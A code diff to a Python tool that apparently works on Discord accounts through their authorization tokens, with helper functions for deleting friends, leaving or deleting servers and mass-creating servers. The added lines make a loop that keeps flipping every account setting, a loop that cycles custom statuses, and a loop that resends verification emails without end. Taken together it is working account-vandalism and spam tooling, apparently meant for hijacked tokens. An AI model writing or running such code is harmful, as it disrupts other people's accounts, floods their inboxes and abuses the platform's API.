@@ -182,15 +182,43 @@ def mass_create(token, name):
 			pass
 
 def mode_spam(token):
-	while True:
-		requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"authorization": token}, json={"theme": "dark", "developer_mode": True, "afk_timeout": 60, "locale": random.choice(lang_codes), "message_display_compact": True, "explicit_content_filter": 2, "default_guilds_restricted": True, "friend_source_flags": {"all": True, "mutual_friends": True, "mutual_guilds": True}, "inline_embed_media": True, "inline_attachment_media": True, "gif_auto_play": True, "render_embeds": True, "render_reactions": True, "animate_emoji": True, "convert_emoticons": True, "animate_stickers": 1, "enable_tts_command": True,  "native_phone_integration_enabled": True, "contact_sync_enabled": True, "allow_accessibility_detection": True, "stream_notifications_enabled": True, "status": "idle", "detect_platform_accounts": True, "disable_games_tab": True})
-		requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"authorization": token}, json={"theme": "light", "developer_mode": False, "afk_timeout": 60, "locale": random.choice(lang_codes), "message_display_compact": False, "explicit_content_filter": 2, "default_guilds_restricted": False, "friend_source_flags": {"all": False, "mutual_friends": False, "mutual_guilds": False}, "inline_embed_media": False, "inline_attachment_media": False, "gif_auto_play": False, "render_embeds": False, "render_reactions": False, "animate_emoji": False, "convert_emoticons": False, "animate_stickers": 1, "enable_tts_command": False,  "native_phone_integration_enabled": False, "contact_sync_enabled": False, "allow_accessibility_detection": False, "stream_notifications_enabled": False, "status": "idle", "detect_platform_accounts": False, "disable_games_tab": False})
+	print('\nPress CTRL + C to stop')
+	try:
+		while True:
+			requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"authorization": token}, json={"theme": "dark", "developer_mode": True, "afk_timeout": 60, "locale": random.choice(lang_codes), "message_display_compact": True, "explicit_content_filter": 2, "default_guilds_restricted": True, "friend_source_flags": {"all": True, "mutual_friends": True, "mutual_guilds": True}, "inline_embed_media": True, "inline_attachment_media": True, "gif_auto_play": True, "render_embeds": True, "render_reactions": True, "animate_emoji": True, "convert_emoticons": True, "animate_stickers": 1, "enable_tts_command": True,  "native_phone_integration_enabled": True, "contact_sync_enabled": True, "allow_accessibility_detection": True, "stream_notifications_enabled": True, "status": "idle", "detect_platform_accounts": True, "disable_games_tab": True})
+			requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"authorization": token}, json={"theme": "light", "developer_mode": False, "afk_timeout": 60, "locale": random.choice(lang_codes), "message_display_compact": False, "explicit_content_filter": 2, "default_guilds_restricted": False, "friend_source_flags": {"all": False, "mutual_friends": False, "mutual_guilds": False}, "inline_embed_media": False, "inline_attachment_media": False, "gif_auto_play": False, "render_embeds": False, "render_reactions": False, "animate_emoji": False, "convert_emoticons": False, "animate_stickers": 1, "enable_tts_command": False,  "native_phone_integration_enabled": False, "contact_sync_enabled": False, "allow_accessibility_detection": False, "stream_notifications_enabled": False, "status": "idle", "detect_platform_accounts": False, "disable_games_tab": False})
+	except KeyboardInterrupt:
+		logo()
 
-TOKEN = ''
-#token_login(TOKEN)
-#del_block_friends(TOKEN)
-#token_info(TOKEN)
-#leave_servers(TOKEN)
-#delete_servers(TOKEN)
-#mass_create(TOKEN, 'ooo')
-mode_spam(TOKEN)
+def custom_status_spam(token, status1, status2, status3, status4, status5):
+	print('\nPress CTRL + C to stop')
+	try:
+		while True:
+			requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"authorization": token}, json={"custom_status": {"text": status1}})
+			time.sleep(0.5)
+			requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"authorization": token}, json={"custom_status": {"text": status2}})
+			time.sleep(0.5)
+			requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"authorization": token}, json={"custom_status": {"text": status3}})
+			time.sleep(0.6)
+			requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"authorization": token}, json={"custom_status": {"text": status4}})
+			time.sleep(0.5)
+			requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"authorization": token}, json={"custom_status": {"text": status5}})
+			time.sleep(0.5)
+	except KeyboardInterrupt:
+		logo()
+
+def spam_mail(token):
+	print('\nPress CTRL + C to stop\n\n')
+	r = requests.get("https://discordapp.com/api/v9/guilds/0/members", headers={"authorization": token})
+	count = 0
+	try:
+		while True:
+			r = requests.post("https://discord.com/api/v9/auth/verify/resend", headers={"authorization": token})
+			count += 1
+			sys.stdout.write(f'\rVerify mails sent: {count}')
+			sys.stdout.flush()
+			time.sleep(1)
+	except KeyboardInterrupt:
+		logo()
+
+
